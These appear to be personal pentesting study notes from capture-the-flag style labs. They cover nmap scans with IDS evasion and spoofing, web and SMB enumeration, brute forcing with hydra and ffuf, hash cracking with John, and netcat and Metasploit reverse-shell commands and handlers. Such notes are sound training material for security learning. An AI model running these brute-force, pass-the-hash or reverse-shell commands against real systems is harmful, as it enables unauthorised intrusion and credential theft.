# Enumeration

## Scan

displays if there are open ports
`ping [domain OR ip address]
manually query recursive DNS servers
displays TTL
`dig
Query who a domain name is registered to
`whois
see every intermediate step between your computer 
and the resource that you requested
`traceroute

### nmap [host / ip]

- -p 80 --scans port 80
- -p- scans all ports
- -A Enable OS detection, version detection, script scanning, and traceroute
- -v verbose
- -F: Fast mode
- --top-ports [number] 		Scan [number] most common ports
- -sL: List Scan - simply list targets to scan
- -sn: Ping Scan - disable port scan
- -sS    stealth scan/TCP SYN Scan
- -f, -ff:    Fragments packets into 8 or 16 bytes to avoid Firewall IDS


`nmap $ip -p- -A -v -top-ports 100`

Runs a vulnerability test using a script
`nmap -Pn --script vuln 192.168.1.105`

Runs all most popular scripts
`nmap -sC 192.168.122.1`

location of all nmap scripts
`/usr/share/nmap/scripts`

Run all the scripts within a category
`nmap --script discovery 192.168.122.1`

Scan to avoid IDS
`sudo nmap -vv -f -D RND:5 -T3 -sN 10.10.197.143
- Set verbosity to very verbose `-vv`
- Use tiny fragmented IP packets `-f`
- Decoy scan with random IPs (`RND:5`) `-D`
- Set timing to normal `-T3`
- Stealth null scan `-sN

| Script Category | Description                                                            |
| --------------- | ---------------------------------------------------------------------- |
| `auth`          | Authentication related scripts                                         |
| `broadcast`     | Discover hosts by sending broadcast messages                           |
| `brute`         | Performs brute-force password auditing against logins                  |
| `default`       | Default scripts, same as `-sC`                                         |
| `discovery`     | Retrieve accessible information, such as database tables and DNS names |
| `dos`           | Detects servers vulnerable to Denial of Service (DoS)                  |
| `exploit`       | Attempts to exploit various vulnerable services                        |
| `external`      | Checks using a third-party service, such as Geoplugin and Virustotal   |
| `fuzzer`        | Launch fuzzing attacks                                                 |
| `intrusive`     | Intrusive scripts such as brute-force attacks and exploitation         |
| `malware`       | Scans for backdoors                                                    |
| `safe`          | Safe scripts that won’t crash the target                               |
| `version`       | Retrieve service versions                                              |
| `vuln`          | Checks for vulnerabilities or exploit vulnerable services              |


`--reason` if you want Nmap to provide more details regarding its reasoning and conclusions

### Wapiti

audit the security of your web applications. It performs “black-box” scan 
https://salsa.debian.org/pkg-security-team/wapiti

### ZAP

Kali program that passive scans site vulns

### whatweb

Kali cli tool that conducts URL and ping scan for host versions

#### ARP Scanning for subnets

ARP scan is possible only if you are on the same subnet as the target systems

Discover all the live systems on the same subnet as our target machine
`sudo nmap -PR -sn 10.10.210.6/24

#### ICMP Scanning for subnets

Scan will send ICMP echo packets to every IP address on the subnet
`nmap -PE -sn MACHINE_IP/24`. 

#### Spoof IP Origin

specify the network interface using `-e` and to explicitly disable ping scan `-Pn`
`nmap -e NET_INTERFACE -Pn -S SPOOFED_IP 10.10.129.232` 
tell Nmap explicitly which network interface to use and not to expect to receive a ping reply.
this scan will be useless if the attacker system cannot *monitor the network for responses*.

When on the same subnet as the target machine, spoof your MAC address using
`--spoof-mac SPOOFED_MAC`

Decoy scan
`nmap -D 10.10.0.1,10.10.0.2,ME 10.10.129.232`
`nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME 10.10.129.232`

zombie scan
`nmap -sI ZOMBIE_IP 10.10.129.232`




| Port Scan Type | Example Command |
| ---- | ---- |
| TCP Null Scan | `sudo nmap -sN 10.10.254.98` |
| TCP FIN Scan | `sudo nmap -sF 10.10.254.98` |
| TCP Xmas Scan | `sudo nmap -sX 10.10.254.98` |
| TCP Maimon Scan | `sudo nmap -sM 10.10.254.98` |
| TCP ACK Scan | `sudo nmap -sA 10.10.254.98` |
| TCP Window Scan | `sudo nmap -sW 10.10.254.98` |
| Custom TCP Scan | `sudo nmap --scanflags URGACKPSHRSTSYNFIN 10.10.254.98` |
| Spoofed Source IP | `sudo nmap -S SPOOFED_IP 10.10.254.98` |
| Spoofed MAC Address | `--spoof-mac SPOOFED_MAC` |
| Decoy Scan | `nmap -D DECOY_IP,ME 10.10.254.98` |
| Idle (Zombie) Scan | `sudo nmap -sI ZOMBIE_IP 10.10.254.98` |
| Fragment IP data into 8 bytes | `-f` |
| Fragment IP data into 16 bytes | `-ff` |
| `--source-port PORT_NUM` | specify port number  |


| ARP Scan | `sudo nmap -PR -sn MACHINE_IP/24` |
| ---- | ---- |
| ICMP Echo Scan | `sudo nmap -PE -sn MACHINE_IP/24` |
| ICMP Timestamp Scan | `sudo nmap -PP -sn MACHINE_IP/24` |
| ICMP Address Mask Scan | `sudo nmap -PM -sn MACHINE_IP/24` |
| TCP SYN Ping Scan | `sudo nmap -PS22,80,443 -sn MACHINE_IP/30` |
| TCP ACK Ping Scan | `sudo nmap -PA22,80,443 -sn MACHINE_IP/30` |
| UDP Ping Scan | `sudo nmap -PU53,161,162 -sn MACHINE_IP/30` |
| `-n` | no DNS lookup |
| `-R` | reverse-DNS lookup for all hosts |
|`-sn`|host discovery only|




---

### NFS 

scan NFS or RPC binds 
`nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.136.6

send ARP queries to all valid IP addresses on your local networks
`arp-scan -l`

send ARP queries for all valid IP addresses on the `eth0` interface.
`sudo arp-scan -I eth0 -l` 



---
### WordPress blogs~

```
wpscan
```
scans blogs such as wordpress, then compares them to a locally stored database of attack vectors
```
wpscan --update 		
```
updates local database of CSS themes, plugins and CVEs
```
wpscan --url http://cmnatics.playground/ --enumerate t --enumerate p --enumerate u 
```
enumerates wordpress themes, plugins or users
```
wpscan –-url http://cmnatics.playground –-passwords rockyou.txt –-usernames cmnatic
```
uses bruteforce wordlist on the users you have found
```
--plugins-detection aggressive, --users-detection aggresive --themes-detection aggressive
```
argument that changes scan footprint

---
### Web Directories

```
gobuster dir
OR
dirbuster
```
>gobuster dir -u 10.10.72.231 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
- -t	--threads
Number of concurrent threads (default 10) - change to 64 to go faster
- -o	--output
Output file to write results to
- -x    --extensions
outputs file extensions in folders e.g. -x html, js, txt, conf, php ***THIS ONE IS IMPORTANT***
- -k	--no-tls-validation
Skip TLS certificate verification

>It's important to specify HTTPS:// or HTTP:// when using URLs

An important Gobuster switch here is the -x switch, which can be used to look for files with specific extensions. For example, if you added -x php,txt,html to your Gobuster command, the tool would append .php, .txt, and .html to each word in the selected wordlist, one at a time. This can be very useful if you've managed to upload a payload and the server is changing the name of uploaded files.

### Subdomains


gobuster dns
`gobuster dns -d mydomain.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
- -c	--show-cname
Show CNAME Records (cannot be used with '-i' option)
- -i	--show-ips
Show IP Addresses

#### Common Site SubDomains

- `sitemap`
- `mail` 
- `login`
- `register`
- `admin`
- `console`

### Sub Domain lister tool
`./sublist3r.py -d acmeitsupport.thm

### DNS Enumeration
`dnsrecon -t brt -d acmesupport.thm`

### Vitual Hosts

Virtual hosts are different websites on the same machine. 
In some instances, they can appear to look like sub-domains, but don't be deceived! 
Virtual Hosts are IP based and are running on the same server.

```
gobuster vhost -u http://example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```


Because web servers can host multiple websites from one server when a website is requested from a client, the server knows which website the client wants from the **Host** header. We can utilise this host header by making changes to it and monitoring the response to see if we've discovered a new website.
```shell-session
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP
```
Because the above command will always produce a valid result, we need to filter the output. We can do this by using the page size result with the **-fs** switch. Edit the below command replacing {size} with the most occurring size value from the previous result 
`user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP -fs {size}`


---
## SMB

### smbmap

```shell
smbmap -u jsmith -p password1 -d workgroup -H 192.168.0.1

$ smbmap -u jsmith -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d' -H 172.16.0.20

$ smbmap -u 'apadmin' -p 'asdf1234!' -d ACME -Hh 10.1.3.30 -x 'net group "Domain Admins" /domain'

```

### enum4linux

nmap scan for SMB shares
`nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP
Use enum4linux
`enum4linux -a 10.10.69.691

```
smbclient //10.10.10.2/secret -U suit -p 445
```

- -u    username
- -p    port number

recursively download the SMB share
`smbget -R smb://10.10.136.6/anonymous


## Vulnerable Hosts

### nikto

`nikto -h 10.10.10.10 -p 80,8000,8080
enumerates on ports 80,8000 etc, 
`nmap -p80 172.16.0.0/24 -oG - | nikto -h -
takes the results of the nmap scan, formats them to a nikto friendly format (-oG), then pipes to nikto
`nikto --list plugins
lists useful plugins that are apropriate for the target
`nikto -h 10.10.10.1 -Plugin apacheuser
uses "apacheuser" plugin
`nikto -h 10.10.10.1 -Display 1,2,E
can display 1,2 or E mode (redirects, cookies and errors)
`nikto -h 10.10.10.1 -Tuning (0-9)
Tuning options to find certain vulnerability types
`nikto -h 10.10.10.1 -o NiktoReport.html
can output to certain filetypes like html or txt

---

### Web Exploitation

#### Username Enumeration

```shell
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"`
```

---
## Passive Recon

find domain info
`whois

find IP address of a domain name
`nslookup DOMAIN_NAME`
`nslookup OPTIONS DOMAIN_NAME SERVER`
`nslookup -type=a tryhackme.com 1.1.1.1`

dig
(more in depth than nslookup)
`dig @SERVER DOMAIN_NAME TYPE`

https://dnsdumpster.com/

https://www.shodan.io/

telnet
`telnet 10.10.2.122 80
`GET / HTTP/1.1
`host: raz
you dont have to use port 80
you can connect to any port, then run commands using that ports service e.g. SMTP, POP3






---
# BruteForce

## Nmap

WordPress brute force attack:
`nmap -sV --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com, http-wordpress-brute.threads=3,brute.firstonly=true' 192.168.1.105

Brute force attack against MS-SQL:
`nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt 192.168.1.105

FTP brute force attack:
`nmap --script ftp-brute -p 21 192.168.1.105`


## CeWL

```
cewl http://10.10.198.183
```
Creates a wordlist based on site keywords

1. **Specify spidering depth:** The `-d` option allows you to set how deep CeWL should spider. For example, to spider two links deep: `cewl http://10.10.198.183 -d 2 -w output1.txt`
2. **Set minimum and maximum word length:** Use the `-m` and `-x` options respectively. For instance, to get words between 5 and 10 characters: `cewl http://10.10.198.183 -m 5 -x 10 -w output2.txt`
3. **Handle authentication:** If the target site is behind a login, you can use the `-a` flag for form-based authentication.
4. **Custom extensions:** The `--with-numbers` option will append numbers to words, and using `--extension` allows you to append custom extensions to each word, making it useful for directory or file brute-forcing.
5. **Follow external links:** By default, CeWL doesn't spider external sites, but using the `--offsite` option allows you to do so.

## Crunch

``crunch 3 3 0123456789ABCDEF -o 3digits.txt``
Generates a list of possible passcodes

The command above specifies the following:

- `3` the first number is the minimum length of the generated password
- `3` the second number is the maximum length of the generated password
- `0123456789ABCDEF` is the character set to use to generate the passwords
- `-o 3digits.txt` saves the output to the `3digits.txt` file

## ffuf

```
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
```
`W1` for our list of valid usernames and `W2` for the list of passwords we will try
For a positive match, we're using the `-fc` argument to check for an HTTP status code other than 200.

## WFuzz

Wfuzz is a tool designed for brute-forcing web applications. It can be used to find resources not linked directories, servlets, scripts, etc, brute-force GET and POST parameters for checking different kinds of injections (SQL, XSS, LDAP), brute-force forms parameters (user/password) and fuzzing.

```shell-session
wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.198.183/login.php -d "username=FUZZ&password=FUZ2Z"
```

- `-z file,usernames.txt` loads the usernames list.
- `-z file,passwords.txt` uses the password list generated by CeWL.
- `--hs "Please enter the correct credentials"` hides responses containing the string "Please enter the correct credentials", which is the message displayed for wrong login attempts.
- `-u` specifies the target URL.
- `-d "username=FUZZ&password=FUZ2Z"` provides the POST data format where **FUZZ** will be replaced by usernames and **FUZ2Z** by passwords.

## Hydra

`hydra -l username -P wordlist.txt server service`

`hydra -l jan -P ~/rockyou/rockyou.txt -f -v ssh://10.10.37.200

- `hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.211.141 ftp` will use `mark` as the username as it iterates over the provided passwords against the FTP server.
- `hydra -l mark -P /usr/share/wordlists/rockyou.txt ftp://10.10.211.141` is identical to the previous example. `10.10.211.141 ftp` is the same as `ftp://10.10.211.141`.
- `hydra -l frank -P /usr/share/wordlists/rockyou.txt 10.10.211.141 ssh` will use `frank` as the user name as it tries to login via SSH using the different passwords.

- `-s PORT` to specify a non-default port for the service in question.
- `-V` or `-vV`, for verbose, makes Hydra show the username and password combinations that are being tried. This verbosity is very convenient to see the progress, especially if you are still not confident of your command-line syntax.
- `-t n` where n is the number of parallel connections to the target. `-t 16` will create 16 threads used to connect to the target.
- `-d`, for debugging, to get more detailed information about what’s going on. The debugging output can save you much frustration; for instance, if Hydra tries to connect to a closed port and timing out, `-d` will reveal this right away.

---

`hydra -l '' -P 3digits.txt -f -v 10.10.123.72 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000`

The command above will try one password after another in the `3digits.txt` file. It specifies the following:

- `-l ''` indicates that the login name is blank as the security lock only requires a password
- `-P 3digits.txt` specifies the password file to use
- `-f` stops Hydra after finding a working password
- `-v` provides verbose output and is helpful for catching errors
- `10.10.123.72` is the IP address of the target
- `http-post-form` specifies the HTTP method to use
- `"/login.php:pin=^PASS^:Access denied"` has three parts separated by `:`
    - `/login.php` is the page where the PIN code is submitted
    - `pin=^PASS^` will replace `^PASS^` with values from the password list
    - `Access denied` indicates that invalid passwords will lead to a page that contains the text “Access denied”
- `-s 8000` indicates the port number on the target

```
~hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.221.163 ssh
```
- -t 	--uses 16 parallel connections
- -P	--path to wordlist
- uses ssh

```
sudo hydra -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt 10.10.134.126 http-post-form "/login/login.php:username=R1ckRul3s&password=^PASS^&sub=Login:Invalid username or password."
```
- http-post-form    --uses post from the subdirectory
- username=R1ckRul3s&password=^PASS^&sub=Login      --found in the network tab under "send and edit"
- Invalid username or password.     -- Invalid creds state, found by entering the incorrect credentials 

---
## johntheRipper

### you can also use https://crackstation.net/ to crack hashes

wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py

RSA Key Cracker
`ssh2john RSA_Key_file > RSAforJohn.txt`
`john RSAforJohn --wordlist=rockyou/rockyou.txt

hash identifier
```
john hash.txt
```
uses johntheripper to crack hashed passwords
```
john --wordlist=[path to wordlist] [path to file]
```
--wordlist=~/Tryhackme/wordlists/rockyou.txt hash.txt
```
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt
```

>if you're dealing with a standard hash type, e.g. md5 as in the example above, you have to prefix it with `raw-` to tell john you're just dealing with a standard hash type, though this doesn't always apply. To check if you need to add the prefix or not, you can list all of John's formats using john `--list=formats` and either check manually, or grep for your hash type using something like `john --list=formats | grep -iF "md5"`

---

```
unshadow [path to passwd] [path to shadow]
```

>[path to passwd] - The file that contains the copy of the /etc/passwd file you've taken from the target machine

>[path to shadow] - The file that contains the copy of the /etc/shadow file you've taken from the target machine

John can be very particular about the formats it needs data in to be able to work with it, for this reason- in order to crack /etc/shadow passwords, you must combine it with the /etc/passwd file in order for John to understand the data it's being given. To do this, we use a tool built into the John suite of tools called unshadow 

---
```
zip2john [options] [zip file] > [output file]
```
convert the zip file into a hash format that John is able to understand

```
rar2john [options] [rar file] > [output file]
```
convert the rar file into a hash format that John is able to understand

```
ssh2john [options] [rsa file] > [output file]
```
convert the ssh file into a hash format that John is able to understand

```
john --single --format=[format] [path to file] 
```
--single mode is used for username mangling
>If you're cracking hashes in single crack mode, you need to change the file format that you're feeding john for it to understand what data to create a wordlist from. You do this by prepending the hash with the username that the hash belongs to, so according to the above example- we would change the file hashes.txt from: `1efee03cdcb96d90ad48ccc7b8666033` To `mike:1efee03cdcb96d90ad48ccc7b8666033`


```
Intruder tab on Burpsuite
```

---
# Reverse Shells

Payloads all the Things
>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

Reverse Shell Cheatsheet
>https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Reverse Shell Generator
>https://www.revshells.com/

Metasploit has several payloads under “cmd/unix” that can be used to generate one-liner bind or reverse shells:
```shell
msfvenom -l payloads | grep "cmd/unix"
```


### MSF Listener

- Open a new terminal window and run `msfconsole` to start the Metasploit Framework
- `use multi/handler` to handle incoming connections
- `set payload windows/meterpreter/reverse_tcp` to ensure that our payload works with the payload used when creating the malicious macro  
- `set LHOST 10.10.170.181` specifies the IP address of the attacker’s system and should be the same as the one used when creating the document
- `set LPORT 8888` specifies the port number you are going to listen on and should be the same as the one used when creating the document
- `show options` to confirm the values of your options
- `exploit` starts listening for incoming connections to establish a reverse shell



---

### Reverse Shell example

starts a listener
on the attacking machine
`sudo nc -lvnp 443

Run on the target to connect with a shell 
`nc <LOCAL-IP> <PORT> -e /bin/bash

OR
Connecting to this  listener with netcat would result in a bind shell on the target
`nc -lvnp <PORT> -e /bin/bash`

---

### Bind Shell example

On the attacking machine
```n
c 10.10.36.67 <port>
```

On the target
```
nc -lvnp <port> -e "cmd.sh"
```
>--cmd.exe would contain code that starts a listener attached to a shell directly on the target

---

## Stabilisation

### rlwrap listener & stabilization
```
rlwrap nc -lvnp <port>
```
>starts listener on host

background the shell with `Ctrl + Z`, then use `stty raw -echo; fg` to stabilise and re-enter the shell. 

---
### Python stabilize


1. have to explicitly state python,python2,python3
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
2. (press ctrl+Z to background the shell)
3. Use `stty raw -echo` to give us access to term commands such as clear 
4. reconnect to the shell through the listener
5. Then use` export TERM=xterm




---

### soCat stabilization

use a webserver on the attacking machine inside the directory containing your socat binary 
```
~sudo python3 -m http.server 80
```
then, on the target machine, using the netcat shell to download the file.
```
get <LOCAL-IP>/socat -O /tmp/socat
```
```
~Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
```

---

### Change terminal tty size~

First, open another terminal and run 
```
stty -a
```
This will give you a large stream of output. Note down the values for "rows" and columns

Next, in your reverse/bind shell, type in:
```
~stty rows <number>
~stty cols <number>	
```
This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.



---

